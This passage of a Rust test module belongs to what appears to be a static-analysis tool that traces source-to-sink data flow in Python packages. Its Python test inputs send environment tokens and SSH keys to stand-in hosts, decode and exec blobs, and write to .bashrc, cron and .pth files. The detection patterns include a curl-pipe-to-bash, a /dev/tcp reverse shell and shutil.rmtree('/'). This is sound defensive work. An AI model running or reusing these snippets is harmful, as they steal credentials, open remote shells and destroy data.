    }
    // The last edge enters the sink's parameter node; that step *is* the sink.
    let sink_step = PathStep {
        kind: PathStepKind::Sink,
        location: sink.location.clone(),
        symbol: sink.pattern.to_string(),
        detail: None,
    };
    if steps.len() > 1 {
        *steps.last_mut().expect("non-empty") = sink_step;
    } else {
        steps.push(sink_step);
    }
    ReachabilityPath {
        kind: ReachabilityKind::Data,
        steps,
        confidence,
        obfuscated,
        conditional: false,
    }
}

fn location(pg: &PackageGraph, file: FileId, span: Span) -> Location {
    Location {
        file,
        path: pg.file_path(file).unwrap_or_default().to_owned(),
        span,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::test_support::graph_from_sources;
    use phylaxis_core::{Confidence, PathStepKind, ReachabilityKind};

    const ENV: &[SourcePattern] = &[SourcePattern {
        kind: TaintSourceKind::Environment,
        pattern: "os.environ",
    }];
    const POST: &[SinkPattern] = &[SinkPattern {
        kind: TaintSinkKind::NetworkEgress,
        pattern: "requests.post",
        arg: None,
    }];

    fn paths(src: &str) -> (Vec<TaintSource>, Vec<TaintSink>, Vec<ReachabilityPath>) {
        let g = graph_from_sources(&[("pkg/a.py", src)]);
        let sources = find_sources(&g, ENV);
        let sinks = find_sinks(&g, POST);
        let p = data_paths(&g, &sources, &sinks, &ReachLimits::default());
        (sources, sinks, p)
    }

    // ── THE NOVELTY PAIR ────────────────────────────────────────────────────────────
    // These two tests are the executable form of the thesis contribution: reachability,
    // not co-occurrence (CLAUDE.md, invariant 3). They differ in exactly one token: whether the
    // value read from the environment is the value that is sent. Both files contain an
    // environment read and a network write; a co-occurrence tool flags both. Only the
    // first contains a path. Do not rename these two: they are cited by name elsewhere.

    /// A source→sink path exists: the environment value flows into the request body.
    #[test]
    fn reachability_finds_env_to_network_path() {
        let (sources, sinks, p) = paths(
            "import os\nimport requests\n\ntoken = os.environ['TOKEN']\nrequests.post('https://collector.invalid/', data=token)\n",
        );
        assert_eq!(sources.len(), 1);
        assert_eq!(sinks.len(), 1);
        assert_eq!(p.len(), 1, "exactly one path: env → token → post");
        let path = &p[0];
        assert_eq!(path.kind, ReachabilityKind::Data);
        assert_eq!(path.steps.first().unwrap().kind, PathStepKind::Source);
        assert_eq!(path.steps.last().unwrap().kind, PathStepKind::Sink);
        assert_eq!(path.confidence, Confidence::Resolved);
        assert!(!path.obfuscated);
    }

    /// The same source and the same sink in the same file, but the value sent is a
    /// constant: no path, therefore no finding. Co-occurrence alone is not evidence.
    #[test]
    fn cooccurrence_without_flow_yields_no_path() {
        let (sources, sinks, p) = paths(
            "import os\nimport requests\n\ntoken = os.environ['TOKEN']\nrequests.post('https://collector.invalid/', data='static')\n",
        );
        assert_eq!(sources.len(), 1, "the source IS present");
        assert_eq!(sinks.len(), 1, "the sink IS present");
        assert!(p.is_empty(), "but nothing flows between them");
    }
    // ────────────────────────────────────────────────────────────────────────────────

    // The path survives an interprocedural hop and a taint-preserving transform, and the
    // transform marks it obfuscated.
    #[test]
    fn path_crosses_function_boundary_and_encoder() {
        let (_, _, p) = paths(
            "import os, base64, requests\n\ndef wrap(v):\n    return base64.b64encode(v.encode())\n\ndef send(payload):\n    requests.post('https://c.invalid/', data=payload)\n\nsend(wrap(os.environ['TOKEN']))\n",
        );
        assert_eq!(p.len(), 1);
        assert!(p[0].obfuscated);
        assert!(p[0].steps.iter().any(|s| s.kind == PathStepKind::Transform));
        assert!(p[0].steps.iter().any(|s| s.kind == PathStepKind::Call));
    }

    // A non-preserving call between source and sink breaks the path (ADR-006).
    #[test]
    fn non_preserving_call_breaks_the_path() {
        let (_, _, p) = paths(
            "import os, requests\nn = len(os.environ['TOKEN'])\nrequests.post('https://c.invalid/', data=n)\n",
        );
        assert!(p.is_empty());
    }

    // Ambiguous resolution lowers the path's confidence but keeps the path (ADR-007).
    #[test]
    fn ambiguous_edge_lowers_confidence_but_keeps_path() {
        let (_, _, p) = paths(
            "import os, requests\nclass S:\n    def send(self, v):\n        requests.post('https://c.invalid/', data=v)\ndef go(obj):\n    obj.send(os.environ['TOKEN'])\n",
        );
        assert_eq!(p.len(), 1);
        assert_eq!(p[0].confidence, Confidence::Ambiguous);
    }

    // Determinism: identical inputs yield identical paths, step for step.
    #[test]
    fn paths_are_deterministic() {
        let src = "import os, requests\na = os.environ['A']\nb = os.environ['B']\nrequests.post('https://c.invalid/', data=a)\nrequests.post('https://c.invalid/', data=b)\n";
        let (_, _, p1) = paths(src);
        let (_, _, p2) = paths(src);
        assert_eq!(p1, p2);
        assert_eq!(p1.len(), 2);
    }

    // ── Literal-valued sources ──────────────────────────────────────────────────────

    const DECODED: &[SourcePattern] = &[SourcePattern {
        kind: TaintSourceKind::DecodedLiteral,
        pattern: "<fold>",
    }];
    const EXEC: &[SinkPattern] = &[SinkPattern {
        kind: TaintSinkKind::CodeExecution,
        pattern: "exec",
        arg: Some(0),
    }];

    fn decoded_paths(src: &str) -> (Vec<TaintSource>, Vec<ReachabilityPath>) {
        let g = graph_from_sources(&[("pkg/a.py", src)]);
        let sources = find_sources(&g, DECODED);
        let sinks = find_sinks(&g, EXEC);
        let p = data_paths(&g, &sources, &sinks, &ReachLimits::default());
        (sources, p)
    }

    // The fixture shape: the blob goes through a variable, and the module is aliased. Neither
    // stops the match, because the graph links the variable and canonicalises the callee.
    #[test]
    fn decoded_constant_through_variable_and_alias_reaches_exec() {
        let (sources, p) = decoded_paths(
            "import base64 as b\n_BLOB = 'aW1wb3J0IG9z'\nexec(b.b64decode(_BLOB).decode('utf-8'))\n",
        );
        assert_eq!(sources.len(), 1);
        assert_eq!(sources[0].pattern.as_str(), "base64.b64decode");
        assert_eq!(p.len(), 1);
        assert!(p[0].obfuscated, "a decoded constant is obfuscated");
    }

    // A decoder applied to downloaded bytes is a dropper, not an obfuscated literal: the
    // input starts at a call result, not a constant.
    #[test]
    fn decoder_over_network_data_is_not_a_decoded_literal() {
        let (sources, _) = decoded_paths(
            "import base64, requests\nexec(base64.b64decode(requests.get('https://c.invalid/').content))\n",
        );
        assert!(sources.is_empty());
    }

    // ADR-028: printable characters spelled as escapes are encoded; control bytes, binary
    // data, regexes and a lone escaped character are how honest code writes escapes.
    #[test]
    fn escape_encoded_literals() {
        for yes in [
            r"\145\166\141\154",
            r"\x65\x76\x61\x6c",
            // `e…`, assembled so no tool decodes it on the way into this file.
            concat!("\\", "u0065", "\\", "u0076", "\\", "u0061", "\\", "u006c"),
            r"\x65\166\x61\154(x)",
        ] {
            assert!(escape_encoded(yes), "{yes}");
        }
        for no in [
            r"\x1b[31m",
            r"\n\t\r",
            r"\x00\x01\x02\x03\x04",
            r"\x89PNG\r\n\x1a\n",
            r"\d+\.\d+\s*",
            r"price: \x24 5",
            "plain text",
            r"\x41\x42\x43 followed by a much longer plain sentence",
        ] {
            assert!(!escape_encoded(no), "{no}");
        }
    }

    #[test]
    fn command_with_url_needs_a_command_around_a_non_index_url() {
        assert!(command_with_url(
            "curl.exe -L https://evil.invalid/a.exe -o x.exe"
        ));
        assert!(command_with_url("wget \"https://203.0.113.9/p\" -O /tmp/p"));
        assert!(!command_with_url("https://evil.invalid/a.exe"));
        assert!(!command_with_url(
            "pip download https://files.pythonhosted.org/x.tar.gz"
        ));
        assert!(!command_with_url("git describe --tags"));
        assert!(!command_with_url("https://github.com/{}/{}/pull/{}"));
        assert!(command_with_url(
            "curl.exe -L https://evil.invalid/a.exe -o \"{}\""
        ));
        assert!(!url_not_index("https://github.com/{}/{}.git"));
    }

    // Numbers have no data-flow node, so a list of char codes is a constant leaf; the
    // chr-join stage feeding a decoder still counts as constant input. Since ADR-028 `chr`
    // is a decoder itself, so each stage is a source, as with any chain of decoders.
    #[test]
    fn chr_join_of_a_number_list_is_constant_input() {
        let (sources, p) = decoded_paths(
            "import base64\n_CODES = [97, 87, 49]\n_S = ''.join(chr(c) for c in _CODES)\nexec(base64.b64decode(_S))\n",
        );
        let labels: Vec<_> = sources.iter().map(|s| s.pattern.as_str()).collect();
        assert_eq!(labels.len(), 2, "{labels:?}");
        assert!(labels.contains(&"chr") && labels.contains(&"base64.b64decode"));
        assert_eq!(p.len(), 2);
    }

    // SensitiveFile: the path literal flows through expanduser, open and read into the
    // request, which is the whole of EXF-002.
    #[test]
    fn sensitive_file_content_reaches_network() {
        let g = graph_from_sources(&[(
            "pkg/a.py",
            "import os, requests\np = os.path.expanduser('~/.ssh/id_rsa')\nwith open(p, 'rb') as fh:\n    key = fh.read()\nrequests.post('https://c.invalid/', data=key)\n",
        )]);
        let sources = find_sources(
            &g,
            &[SourcePattern {
                kind: TaintSourceKind::SensitiveFile,
                pattern: "~/.ssh",
            }],
        );
        assert_eq!(sources.len(), 1);
        let p = data_paths(&g, &sources, &find_sinks(&g, POST), &ReachLimits::default());
        assert_eq!(p.len(), 1);
    }

    #[test]
    fn literal_shapes() {
        let file = |pat| SourcePattern {
            kind: TaintSourceKind::SensitiveFile,
            pattern: pat,
        };
        let shape = |pat| SourcePattern {
            kind: TaintSourceKind::SuspiciousLiteral,
            pattern: pat,
        };
        assert!(literal_matches(&file("~/.ssh"), "~/.ssh/id_rsa"));
        assert!(literal_matches(&file("~/.ssh"), ".ssh"));
        assert!(literal_matches(&file("~/.aws"), "$HOME/.aws/credentials"));
        assert!(!literal_matches(&file("~/.ssh"), ".sshd_config"));
        assert!(literal_matches(&file("/etc/passwd"), "/etc/passwd"));
        assert!(literal_matches(&file(".env"), "/srv/app/.env"));
        assert!(!literal_matches(&file(".env"), ".envrc"));

        let url = shape("<literal:url-not-index>");
        assert!(literal_matches(&url, "http://drop.example.invalid/k"));
        assert!(!literal_matches(&url, "https://pypi.org/simple/"));
        assert!(!literal_matches(&url, "not a url"));

        let ip = shape("<literal:raw-ip>");
        assert!(literal_matches(&ip, "203.0.113.9"));
        assert!(literal_matches(&ip, "203.0.113.9:4444"));
        assert!(!literal_matches(&ip, "127.0.0.1"));
        assert!(!literal_matches(&ip, "1.2.3"));
        assert!(!literal_matches(&ip, "2.0.10.1a"));

        let sh = shape("<literal:shell-pipeline>");
        assert!(literal_matches(&sh, "curl -s http://x.invalid/i.sh | bash"));
        assert!(literal_matches(
            &sh,
            "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"
        ));
        assert!(!literal_matches(&sh, "git describe --tags"));

        let wallet = shape("<literal:wallet-address>");
        assert!(literal_matches(
            &wallet,
            "0x52908400098527886E0F7030069857D2E4169EE7"
        ));
        assert!(literal_matches(
            &wallet,
            "1BoatSLRHtKNngkdXEeobR76b53LETtpyT"
        ));
        assert!(!literal_matches(&wallet, "0xdeadbeef"));

        let root = shape("<literal:home-or-root-path>");
        assert!(literal_matches(&root, "~"));
        assert!(literal_matches(&root, "/"));
        assert!(literal_matches(&root, "C:\\"));
        assert!(!literal_matches(&root, "build/"));
        assert!(!literal_matches(&root, ""));
    }

    const PERSIST: &[SinkPattern] = &[
        SinkPattern {
            kind: TaintSinkKind::PersistenceWrite,
            pattern: "<write:~/.bashrc>",
            arg: None,
        },
        SinkPattern {
            kind: TaintSinkKind::PersistenceWrite,
            pattern: "<write:/etc/cron>",
            arg: None,
        },
        SinkPattern {
            kind: TaintSinkKind::PersistenceWrite,
            pattern: "<write:site-packages/*.pth>",
            arg: None,
        },
    ];

    fn persistence_sinks(src: &str) -> Vec<String> {
        let g = graph_from_sources(&[("pkg/a.py", src)]);
        find_sinks(&g, PERSIST)
            .into_iter()
            .map(|s| s.pattern.as_str().to_owned())
            .collect()
    }

    // `<write:…>` sinks: a write into a handle, matched on what the opened path is built
    // from, however the handle and the path are bound.
    #[test]
    fn persistence_writes_match_on_the_opened_location() {
        assert_eq!(
            persistence_sinks(
                "import os
rc = os.path.join(os.path.expanduser('~'), '.bashrc')
with open(rc, 'a') as fh:
    fh.write('x')
"
            ),
            ["<write:~/.bashrc>"]
        );
        assert_eq!(
            persistence_sinks(
                "fh = open('/etc/cron.d/job', 'w')
fh.write('x')
"
            ),
            ["<write:/etc/cron>"]
        );
        assert_eq!(
            persistence_sinks(
                "import os, site
t = os.path.join(site.getsitepackages()[0], 'a.pth')
with open(t, 'wb') as fh:
    fh.write(b'x')
"
            ),
            ["<write:site-packages/*.pth>"]
        );
    }

    // An ordinary file is not a persistence location, a `.pth` outside site-packages is not
    // either, and what is *written* never decides where the file is.
    #[test]
    fn other_writes_are_not_persistence_sinks() {
        assert!(
            persistence_sinks(
                "with open('out.json', 'w') as fh:
    fh.write('x')
"
            )
            .is_empty()
        );
        assert!(
            persistence_sinks(
                "with open('build/a.pth', 'w') as fh:
    fh.write('x')
"
            )
            .is_empty()
        );
        assert!(
            persistence_sinks(
                "t = 'out.txt'
with open(t, 'w') as fh:
    fh.write('http://c.invalid/.bashrc')
"
            )
            .is_empty()
        );
    }

    // ADR-024: a root literal used only as a separator or affix of a string method is not
    // a source; used as a path, including through `os.path.join`, it still is.
    #[test]
    fn separator_uses_of_a_root_literal_are_not_sources() {
        let root = [SourcePattern {
            kind: TaintSourceKind::SuspiciousLiteral,
            pattern: "<literal:home-or-root-path>",
        }];
        let count =
            |src: &str| find_sources(&graph_from_sources(&[("pkg/a.py", src)]), &root).len();
        assert_eq!(
            count(
                "import subprocess
def f(x):
    subprocess.run(x.replace('/', '\\'))
"
            ),
            0
        );
        assert_eq!(
            count(
                "def f(x):
    return '/'.join(x.split('/'))
"
            ),
            0
        );
        assert_eq!(
            count(
                "def f(p):
    return p.startswith('/')
"
            ),
            0
        );
        assert_eq!(
            count(
                "import shutil
def f():
    shutil.rmtree('/')
"
            ),
            1
        );
        assert_eq!(
            count(
                "import os
def f(d):
    return os.path.join('/', d)
"
            ),
            1
        );
        assert_eq!(
            count(
                "import shutil
def f():
    shutil.rmtree('~')
"
            ),
            1
        );
    }

    // Control reachability: from the install root to a network sink through a helper.
    #[test]
    fn control_path_from_install_root_to_sink() {
        let g = graph_from_sources(&[(
            "setup.py",
            "import urllib.request\ndef fetch():\n    urllib.request.urlopen('https://c.invalid/')\nfetch()\n",
        )]);
        let sinks = find_sinks(
            &g,
            &[SinkPattern {
                kind: TaintSinkKind::NetworkEgress,
                pattern: "urllib.request.urlopen",
                arg: None,
            }],
        );
        let root = g
            .phases
            .roots
            .iter()
            .find(|r| r.phase == phylaxis_core::ExecutionPhase::Install)
            .expect("install root");
        let p = control_paths(&g, root, &sinks, &ReachLimits::default());
        assert_eq!(p.len(), 1);
        assert_eq!(p[0].kind, ReachabilityKind::Control);
        assert_eq!(p[0].steps.first().unwrap().kind, PathStepKind::Source);
        assert!(p[0].steps.iter().any(|s| s.kind == PathStepKind::Call));
        assert_eq!(p[0].steps.last().unwrap().kind, PathStepKind::Sink);
    }

    // The depth bound truncates rather than hangs.
    #[test]
    fn depth_limit_is_respected() {
        let (_, _, p) = paths(
            "import os, requests\nv = os.environ['T']\nfor _ in range(3):\n    v = v + 'x'\nrequests.post('https://c.invalid/', data=v)\n",
        );
        assert_eq!(p.len(), 1);
        let g = graph_from_sources(&[(
            "pkg/a.py",
            "import os, requests\nv = os.environ['T']\nv = v + 'x'\nv = v + 'y'\nrequests.post('https://c.invalid/', data=v)\n",
        )]);
        let s = find_sources(&g, ENV);
        let k = find_sinks(&g, POST);
        let tight = data_paths(
            &g,
            &s,
            &k,
            &ReachLimits {
                max_depth: 1,
                max_paths_per_pair: 1,
            },
        );
        assert!(
            tight.is_empty(),
            "a depth limit of 1 cannot reach through two assignments"
        );
    }
}
